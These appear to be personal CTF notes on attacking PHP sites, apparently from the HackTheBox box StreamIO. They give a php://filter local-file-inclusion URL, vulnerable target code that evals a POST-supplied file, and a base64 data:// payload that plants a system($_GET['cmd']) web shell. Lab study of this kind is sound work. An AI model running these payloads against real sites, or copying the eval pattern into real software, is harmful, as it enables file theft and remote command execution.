# If I have to deal with a php website:

### If you want to extract data / check for an LFI
Use php function/wrappers (filter for example) [LFI php hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter)

The following example is from StreamIO.htb it allow me to extract index.php:
```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```
(you can fuzz the index.php with a wordlist)

###  RFI using [://data](https://book.hacktricks.xyz/pentesting-web/file-inclusion#data)

The target server run the following code

```php
<?php$
if(isset($_POST['include'])) {
	if($_POST['include'] !== "index.php" )
		eval(file_get_contents($_POST['include']));
	else
		echo(" ---- ERROR ---- ");
}
?>
```

In my post request I can use this include (with a base64 payload)
```
include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```



We can use phpinfo() and take a look at the disable_function to see what function are prohibited